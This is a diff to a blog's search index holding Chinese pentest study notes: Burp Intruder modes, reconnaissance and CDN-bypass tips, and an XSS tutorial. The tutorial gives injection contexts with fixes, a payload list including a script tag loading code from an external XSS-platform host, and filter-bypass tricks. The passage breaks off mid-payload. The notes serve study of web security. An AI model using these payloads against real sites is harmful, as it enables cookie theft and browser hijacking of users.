@@ -1,6 +1,170 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>UsageOfTolls</title>
+    <url>/2021/01/13/UsageOfTolls/</url>
+    <content><![CDATA[<h1 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h1><h2 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h2><h3 id="Intruder模块"><a href="#Intruder模块" class="headerlink" title="Intruder模块"></a>Intruder模块</h3><p>默认第一个包为默认包</p>
+<h4 id="sniper"><a href="#sniper" class="headerlink" title="sniper"></a>sniper</h4><p>只能设置一个字典</p>
+<p>如果有两个字段(如，username=$name$,password=$passwd$) 则先替换第一个字段保持第二个字段为默认值，直到字典全部替换完成，再替换第二个字段，保持第一个字段为默认值</p>
+<h4 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering ram"></a>Battering ram</h4><p>只能设置一个字典</p>
+<p>如果有两个字段，字段同步替换两个字段</p>
+<h4 id="Pitchfork"><a href="#Pitchfork" class="headerlink" title="Pitchfork"></a>Pitchfork</h4><p>可以设置两个以上字典</p>
+<p>如果有两个字段，第一个字典替换第一个字段，第二个字典替换第二个字段，二者是同步替换的</p>
+<h4 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb"></a>Cluster bomb</h4><p>可以设置两个以上字典</p>
+<p>如果有两个字段，第一个字典替换第一个字段，第二个字典替换第二个字段，并且是一对多匹配(第一个字典第一个字段匹配第二个字典的全部字段，再进行第一个字典的第二个字段匹配)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ALL</title>
+    <url>/2021/01/12/ALL/</url>
+    <content><![CDATA[<h1 id="渗透测试步骤"><a href="#渗透测试步骤" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h1><h2 id="获得授权"><a href="#获得授权" class="headerlink" title="获得授权"></a>获得授权</h2><p>渗透测试即将开始的时候我们需要获得测试目标提供的授权，否则无法进行下去</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>知己知彼，方能百战百胜。进行渗透测试的时候首先需要针对网站及个人进行信息收集</p>
+<h2 id="挖掘利用"><a href="#挖掘利用" class="headerlink" title="挖掘利用"></a>挖掘利用</h2><p>这是渗透测试最主要的环节，挖掘并且利用漏洞</p>
+<h2 id="整理报告"><a href="#整理报告" class="headerlink" title="整理报告"></a>整理报告</h2><p>做完渗透测试，我们要根据情况整理报告</p>
+<h1 id="杂类"><a href="#杂类" class="headerlink" title="杂类"></a>杂类</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><table>
+<thead>
+<tr>
+<th>编码</th>
+<th>解释</th>
+<th>编码格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL编码</td>
+<td>浏览器用于打包表单输入的格式</td>
+<td>% + 十六进制字符</td>
+</tr>
+<tr>
+<td>base64编码</td>
+<td>用于传输8bit字节代码的编码方式之一</td>
+<td>大小写字母数字 或 大小写字母数字 + =</td>
+</tr>
+<tr>
+<td>HTML实体化编码</td>
+<td>对标签进行实体化</td>
+<td>&amp;开头或&amp;#开头，; 结尾</td>
+</tr>
+</tbody></table>
+<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><h3 id="MD5加密-信息摘要算法第五代"><a href="#MD5加密-信息摘要算法第五代" class="headerlink" title="MD5加密[信息摘要算法第五代]"></a>MD5加密[信息摘要算法第五代]</h3><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>1.压缩性：任意长度字符经过MD5算法之后得出的值长度都是一样的</p>
+<p>2.容易计算：从原始数据算出MD5值很容易</p>
+<p>3.抗修改性：对原始数据进行任何改动，即使只改动一个字符，得出的值都有很大区别</p>
+<p>4.强抗碰撞：已知一个原始数据和其MD5值，要找到一个相同MD5值的数据很困难</p>
+<p><strong>MD5默认长度为16位和32位</strong></p>
+<p><strong>MD5只能由<code>abcdef和0-9</code>组成</strong></p>
+<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">md5在线解密</a></p>
+<p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">在线解密站点</a></p>
+<h1 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>暴力破解 搜索引擎 站内爬虫</p>
+<h3 id="whois查询-amp-备案查询"><a href="#whois查询-amp-备案查询" class="headerlink" title="whois查询&amp;备案查询"></a>whois查询&amp;备案查询</h3><p><a href="https://whois.chinaz.com/" target="_blank" rel="noopener">whois</a>帮助我们了解站长信息[站长邮箱、联系人之类]</p>
+<p><a href="https://beian.miit.gov.cn/#/Integrated/recordQuery" target="_blank" rel="noopener">备案查询</a>帮助我们扩大范围</p>
+<p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">IP查询</a></p>
+<h3 id="旁站C段-amp-子域名"><a href="#旁站C段-amp-子域名" class="headerlink" title="旁站C段&amp;子域名"></a>旁站C段&amp;子域名</h3><h4 id="旁站C段"><a href="#旁站C段" class="headerlink" title="旁站C段"></a>旁站C段</h4><p>旁站：一个IP上的其他网站</p>
+<p>C段：同一组织持有的IP地址段</p>
+<p><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a>C段扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip="IP/24"</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.webscan.cc/" target="_blank" rel="noopener">在线C段扫描</a></p>
+<h4 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h4><p><a href="http://521.li/post/544.html" target="_blank" rel="noopener"> 子域名挖掘机</a><br>        <a href="https://github.com/helloexp/subdomainBruteFull" target="_blank" rel="noopener">subdomainBrute</a></p>
+<h3 id="空间搜索引擎"><a href="#空间搜索引擎" class="headerlink" title="空间搜索引擎"></a>空间搜索引擎</h3><p><a href="https://www.cnblogs.com/ha9worm/p/7089955.html" target="_blank" rel="noopener">常见搜索引擎语法</a></p>
+<h3 id="CMS信息收集"><a href="#CMS信息收集" class="headerlink" title="CMS信息收集"></a>CMS信息收集</h3><p><a href="https://scan.top15.cn/web/" target="_blank" rel="noopener">ThreatScan</a><br>       <a href="https://github.com/boy-hack/gwhatweb" target="_blank" rel="noopener">脚本识别</a><br>       插件：Wappalyzer</p>
+<h3 id="ASN"><a href="#ASN" class="headerlink" title="ASN"></a>ASN</h3><p><a href="https://bgp.he.net/" target="_blank" rel="noopener">查询网站ASN码</a><br>       或通过插件 DNSlytics获取ASN码<br>       <a href="https://spyse.com/" target="_blank" rel="noopener">asn对应站点查询</a><br>       获取到域名要进行测活，看看能不能访问（越古怪的名字的域名越容易找到东西）</p>
+<h3 id="Web指纹识别"><a href="#Web指纹识别" class="headerlink" title="Web指纹识别"></a>Web指纹识别</h3><p>平台：<br>        <a href="https://www.yunsee.cn/" target="_blank" rel="noopener">云悉</a><br>       <a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">whatweb</a></p>
+<h3 id="站点对应数据库判断"><a href="#站点对应数据库判断" class="headerlink" title="站点对应数据库判断"></a>站点对应数据库判断</h3><p>一般的组合为：asp+access  php+mysql  jsp/aspx+mssql</p>
+<h3 id="站点服务器操作系统判断"><a href="#站点服务器操作系统判断" class="headerlink" title="站点服务器操作系统判断"></a>站点服务器操作系统判断</h3><p>大小写判断windows大小写不敏感linux相反</p>
+<h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><ul>
+<li><p>端口对应的服务<br><a href="https://www.cnblogs.com/botoo/p/10475402.html" target="_blank" rel="noopener">常见服务端口</a></p>
+</li>
+<li><p>端口对应不同站点内容<br><a href="http://www.xxx.com:80" target="_blank" rel="noopener">www.xxx.com:80</a>  <a href="http://www.xxx.com:8080" target="_blank" rel="noopener">www.xxx.com:8080</a> 内容不同—&gt;两个目标</p>
+</li>
+<li><p>工具<br>namp、<a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">msscan</a></p>
+</li>
+</ul>
+<h3 id="CDN检测和绕过–获取真实IP"><a href="#CDN检测和绕过–获取真实IP" class="headerlink" title="CDN检测和绕过–获取真实IP"></a>CDN检测和绕过–获取真实IP</h3><h4 id="检测是否存在不同IP"><a href="#检测是否存在不同IP" class="headerlink" title="检测是否存在不同IP"></a>检测是否存在不同IP</h4><p> <a href="https://ping.chinaz.com/www.baidu.com" target="_blank" rel="noopener">多地ping</a></p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<li>子域名查询<br> 查看站点的子域名是否存在没有配置CDN（多地Ping站点子域名）</li>
+<li>使用国外地址请求<br> 部分站点只做了国内的CDN，所以使用国外ip请求站点可得到真实IP</li>
+<li>邮件服务查询<br>通过网站的邮件服务，可查找邮件发送方的真实IP</li>
+</ul>
+<p> 1.RSS邮件阅<br> 2.站点主动发邮件过来<br> 3.利用网站漏洞比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP<br><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">CDN脚本</a><br><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">CDN参考链接</a></p>
+<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p><a href="https://www.yunpanjingling.com/" target="_blank" rel="noopener">网盘信息泄露</a></p>
+<h3 id="资产监控"><a href="#资产监控" class="headerlink" title="资产监控"></a>资产监控</h3><p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步在线</a><br>       <a href="https://github.com/LangziFun/LangSrcCurise" target="_blank" rel="noopener">LangSrcCurise</a></p>
+<h1 id="漏洞攻防"><a href="#漏洞攻防" class="headerlink" title="漏洞攻防"></a>漏洞攻防</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="构成原理"><a href="#构成原理" class="headerlink" title="构成原理"></a>构成原理</h3><p>密码过于简单，容易被爆破</p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>增加密码强度</p>
+<h2 id="HTML针注入"><a href="#HTML针注入" class="headerlink" title="HTML针注入"></a>HTML针注入</h2><h3 id="构成原理-1"><a href="#构成原理-1" class="headerlink" title="构成原理"></a>构成原理</h3><p>没有对输入或输出进行过滤</p>
+<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>对输入或输出进行过滤，把HTML转为实体（如php 中使用htmlspecialchars()函数进行过滤）</p>
+<h2 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h2>]]></content>
+  </entry>
+  <entry>
+    <title>Xss</title>
+    <url>/2021/01/07/Xss/</url>
+    <content><![CDATA[<h1 id="一起学XSS"><a href="#一起学XSS" class="headerlink" title="一起学XSS"></a><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/0.html" target="_blank" rel="noopener">一起学XSS</a></h1><h1 id="构成原因"><a href="#构成原因" class="headerlink" title="构成原因"></a>构成原因</h1><p>跨站脚本攻击是一种Web应用程序的漏洞，来自用户的不可信数据在没有验证情况下被应用程序进行了处理，没有正确转义(escape) 或编码(encode) 反射回浏览器，导致浏览器引擎执行了非预期代码。</p>
+<h1 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h1><ol>
+<li><p>XSS 的存在，一定是伴随着输入，与输出 2 个概念的。</p>
+</li>
+<li><p>要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。</p>
+</li>
+<li><p>如果输入和输出都没过滤。 那么漏洞将是显而易见的。</p>
+</li>
+</ol>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h3 id="构成原理"><a href="#构成原理" class="headerlink" title="构成原理"></a>构成原理</h3><p>利用服务器对客户端的信任，攻击方构造链接诱使目标点击链接，之后客户端向服务端发送请求，如果存在XSS，就会返回<br>    攻击者将包含恶意代码的连接发送给受害者（利用社工技术），受害者在点击链接后将恶意代码提交给服务器，服务器将将恶意脚本显示在页面上导致恶意代码在浏览器执行，使得攻击者窃取受害者数据或控制浏览器</p>
+<h2 id="存储性"><a href="#存储性" class="headerlink" title="存储性"></a>存储性</h2><h3 id="构成原理-1"><a href="#构成原理-1" class="headerlink" title="构成原理"></a>构成原理</h3><p>攻击者将包含恶意代码的数据提交给服务器进行存储，当用户访问显示恶意代码数据的页面时，导致恶意代码在浏览器执行，使得攻击者窃取受害者数据或控制浏览器</p>
+<h2 id="DOM型-Document-Object-Model-文档对象模型"><a href="#DOM型-Document-Object-Model-文档对象模型" class="headerlink" title="DOM型(Document Object Model 文档对象模型)"></a>DOM型(Document Object Model 文档对象模型)</h2><h3 id="构成原理-2"><a href="#构成原理-2" class="headerlink" title="构成原理"></a>构成原理</h3><p>DOM通过 HTML DOM,树中的所有节点均可通过JavaScript 进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点。</p>
+<p>基于DOM的跨站点脚本<strong>不需要依赖于服务器端响应的内容</strong>，如果某些HTML页面使用了document.location、document.URL 或者document.referer等DOM元素的属性，攻击者可以利用这些属性植入恶意脚本实施基于DOM的跨站点脚本攻击。与反射型xss攻击手法类似，<strong>区别在于恶意脚本直接被js执行而不是通过提交到服务端再通过响应结果执行</strong></p>
+<h1 id="检查方法"><a href="#检查方法" class="headerlink" title="检查方法"></a>检查方法</h1><p>输入处输出自定义字符A，审查页面中是否包含该字符A，如果存在则可能存在XSS</p>
+<h1 id="反射型绕过姿势"><a href="#反射型绕过姿势" class="headerlink" title="反射型绕过姿势"></a>反射型绕过姿势</h1><h2 id="输出在属性值里"><a href="#输出在属性值里" class="headerlink" title="输出在属性值里"></a>输出在属性值里</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://xxx.com/?name=tom&amp;value=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;div name=tom value=&lt;img src=1 onerror=alert(1);&gt; &gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在 HTML 属性中，会自动对实体字符进行转义</span></span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="string">"alert(1)"</span>&gt;和&lt;img src=<span class="string">"1"</span> onerror=<span class="string">"alert&amp;#x28;1&amp;#x29;"</span>&gt;是等价的</span><br><span class="line"><span class="comment">//只要上面的情况，没有过滤 &amp;，# 等符号，我们就可以写入任意字符</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//xxx.com/?name=tom&amp;value=a'+alter(1)</span></span><br><span class="line"><span class="comment">//' ( )转为HTML实体 &amp;#x27; &amp;#x28; &amp;#x29;</span></span><br><span class="line">http:<span class="comment">//xxx.com/?name=tom&amp;value=a&amp;#x27;+alter&amp;#x28;1&amp;#x29;</span></span><br><span class="line"><span class="comment">//&amp; # 转为url编码 %26, %23</span></span><br><span class="line">http:<span class="comment">//xxx.com/?name=tom&amp;value=a%26%23x27;%2balter%26%23x28;1%26%23x29;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">URL编解码</a></p>
+<p><a href="https://tool.oschina.net/commons?type=2" target="_blank" rel="noopener">常用对照表</a></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--让输出在标签内部，将&lt; 和 &gt; 过滤，转为HTML实体</span></span><br><span class="line"><span class="comment">&lt;HTML 标签&gt;[输出]&lt;/HTML 标签&gt;</span></span><br><span class="line"><span class="comment">该过滤\的时候，请过滤\, 该过滤&amp;（过滤为&amp;amp;）的情况，则过滤掉&amp;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="输出在-lt-script-gt-lt-script-gt-之间的情况"><a href="#输出在-lt-script-gt-lt-script-gt-之间的情况" class="headerlink" title="输出在&lt;script&gt;&lt;/script&gt;之间的情况"></a>输出在&lt;script&gt;&lt;/script&gt;之间的情况</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://xxx.com/?name=tom&amp;value=eval('alert(1)');void</span><br><span class="line"><span class="comment">&lt;!-- &lt;script type='text/javascript'&gt;try&#123;parent.eval('alert(1)');void(_ret);&#125;catch(err)&#123; eval('alert(1)');void(_ret);&#125;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--让输出在标签内部，将&lt; 和 &gt; / 过滤，转为HTML实体</span></span><br><span class="line"><span class="comment">&lt;script&gt;...[输出]...&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>使用高位编码(ascii&gt;128)吃掉转义符，造成引号逃逸</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=gb18030"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>存在gbxxx系列编码，可尝试宽字节注入</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://xxx.com/index?value=%22;alter(1);//</span><br><span class="line"><span class="comment">&lt;!--http://xxx.com/index?value=";alter(1);//--&gt;</span></span><br><span class="line">http://xxx.com/index?value=%c0%22;alter(1);//</span><br><span class="line"><span class="comment">&lt;!--http://xxx.com/index?value=%c0%5c%22;alter(1);//     %c0%5c==繺 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="反斜杆注入"><a href="#反斜杆注入" class="headerlink" title="反斜杆注入"></a>反斜杆注入</h2><p>如果没有对<code>\</code>进行过滤，可以使用<code>\</code>对之后的引号进行转义,出现&lt;script&gt;标签之间</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//xxx.com/index?value=a&amp;from=b</span></span><br><span class="line">&lt;script&gt;location=<span class="string">"&amp;value=a"</span>+<span class="string">"&amp;from=b"</span> &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/添加\对"进行过滤，并用/</span><span class="regexp">/注释b后面的" 此时b没有"包裹，故用数字</span></span><br><span class="line"><span class="regexp">&lt;script&gt;location="&amp;value=a \"+"&amp;from=1\\" &lt;/</span>script&gt;</span><br><span class="line"><span class="comment">//因为&amp;的优先级高，此时语句是 location=("字符串"&amp;from)=1,为保证语法正确性=---&gt;==</span></span><br><span class="line">&lt;script&gt;location=<span class="string">"&amp;value=a \"+"</span>&amp;<span class="keyword">from</span>==<span class="number">1</span>\\<span class="string">" &lt;/script&gt;</span></span><br><span class="line"><span class="string">//此时语句是location=("</span>字符串<span class="string">")&amp;(from==1) 因为==优先级高于&amp;，但会出现from为定义</span></span><br><span class="line"><span class="string">//在js中会优先解析函数，在解析函数调用aaa();function aaa()&#123;&#125;和function aaa()&#123;&#125;aaa();是一样的</span></span><br><span class="line"><span class="string">&lt;script&gt;location="</span>&amp;value=a \<span class="string">"+"</span>&amp;<span class="keyword">from</span>==<span class="number">1</span>;<span class="function"><span class="keyword">function</span>/**/<span class="title">from</span>(<span class="params"></span>)</span>&#123;&#125;\\<span class="string">"&lt;/script&gt;</span></span><br><span class="line"><span class="string">//注释可代替空格</span></span><br><span class="line"><span class="string">//插入xss语句</span></span><br><span class="line"><span class="string">&lt;script&gt;location="</span>&amp;value=a \<span class="string">"+"</span>&amp;<span class="keyword">from</span>==<span class="number">1</span>;alert(<span class="number">1</span>);<span class="function"><span class="keyword">function</span>/**/<span class="title">from</span>(<span class="params"></span>)</span>&#123;&#125;<span class="comment">//"&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h3><p>过滤掉 <code>\</code></p>
+<h2 id="换行符注入"><a href="#换行符注入" class="headerlink" title="换行符注入"></a>换行符注入</h2><p>当输出结果出现在注释位置时，可以在输入之后加个换行符可逃出注释范围，造成注入</p>
+<p>存在&lt;script&gt;标签之间</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//xxx.com/index?value=aaa</span></span><br><span class="line"><span class="comment">//&lt;script&gt;//get("aaa")&lt;\script&gt;</span></span><br><span class="line">http:<span class="comment">//xxx.com/index?value=%0aalter(1);//</span></span><br><span class="line"><span class="comment">//&lt;script&gt;//get("</span></span><br><span class="line">alter(<span class="number">1</span>);<span class="comment">//")</span></span><br><span class="line"><span class="comment">//%0a为换行符</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>尽量不要在 JS 的注释里输出内容</p>
+<h1 id="DOM型绕过姿势"><a href="#DOM型绕过姿势" class="headerlink" title="DOM型绕过姿势"></a>DOM型绕过姿势</h1><h2 id="显示输出"><a href="#显示输出" class="headerlink" title="显示输出"></a>显示输出</h2><p>触发位置<code>innerHTML=&quot;[输出]&quot;</code>，没有对输出结果过滤</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">innerHTML中的可以写入&lt;img&gt;标签进行触发</span></span><br><span class="line">innerHTML="&lt;img src=1 onerror=alert(1)&gt;"</span><br><span class="line"><span class="meta">#</span><span class="bash">JS 的字符串中的字符可以写为 unicode 编码</span></span><br><span class="line"><span class="meta">#</span><span class="bash">\u003 \x3c对应&lt; , \u003e \x3e 对应 &gt; , \u0020 对应 空格</span></span><br><span class="line">innerHTML="\u003cimg\u0020src=1\u0020onerror=alert(1)\u003e"</span><br><span class="line">innerHTML="\x3cimg\u0020src=1\u0020onerror=alert(1)\x3e"</span><br></pre></td></tr></table></figure>
+
+<h3 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h3><p>方法 1. 输出时，过滤 <code>\</code></p>
+<p>方法 2. <code>innerHTML=encodeHTML([输出])</code></p>
+<h2 id="隐式输出"><a href="#隐式输出" class="headerlink" title="隐式输出"></a>隐式输出</h2><p>没有对输入参数进行有效过滤，譬如：<code>var x=location.href;</code> 这句 Javascript 实际上进行了一个隐 藏的输出操作，即将 <code>location.href</code> 的内容输出到了 x 变量中</p>
+<h2 id="出现在eval-函数中"><a href="#出现在eval-函数中" class="headerlink" title="出现在eval()函数中"></a>出现在eval()函数中</h2><p>输出最终并没有流向 innerHTML 或 document.write， 而是与 eval 发生了邂逅</p>
+<h1 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h1><p>存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说： 反射型是：输入–输出；</p>
+<p>存储型是：输入–进入数据库–取出数据库–输出。 这样一来，大家应该注意到以下差别：</p>
+<p><strong>反射型是：绝大部分情况下，输入在哪里，输出就在哪里。</strong></p>
+<p><strong>存储型是：输入在 A 处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</strong></p>
+<p>反射型是：输入大部分位于地址栏或来自 DOM 的某些属性，也会偶尔有数据在请求中（POST 类型） 存储型是：输入大部分来自 POST/GET 请求，常见于一些保存操作中。</p>
+<p>因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型 XSS。 至于如何根据输出来构建存储型 XSS 的代码，和反射型没有任何区别，都是看输出的上下文来进行。 从程序员过滤代码的角度来讲，我们给之后的教程走向分个类：</p>
+<ol>
+<li><p>数据需要过滤，但是未过滤。导致 XSS。 比如：昵称、个人资料。</p>
+</li>
+<li><p>业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致 XSS。 比如：日志、邮件及其它富文本应用。 本节先看一个最基本的情况，该过滤，但是什么都没过滤的情况。</p>
+<p><strong>存储型 XSS，输出的位置不一定出现在输入的位置</strong></p>
+</li>
+</ol>
+<h1 id="XssPayload"><a href="#XssPayload" class="headerlink" title="XssPayload:"></a>XssPayload:</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://xsspt.com/VBAhTu</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">https://www.baidu.com/img/bd_logo1.png</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">M</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"vbscript:msgbox(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="bypass姿势"><a href="#bypass姿势" class="headerlink" title="bypass姿势"></a>bypass姿势</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 空格被过滤 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">"1"</span>/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/**/<span class="attr">src</span>=<span class="string">"1"</span>/**/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 双写绕过 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iimgmg</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">oonerrornerror</span>=<span class="string">aimglert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 大小写绕过  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">oNerRor</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用eval() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">"a=`aler`;b=`t(1)`;eval(a+b);"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">eval(atob(</span>'<span class="attr">YWxlcnQoMSk</span>=<span class="string">'))&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;!-- 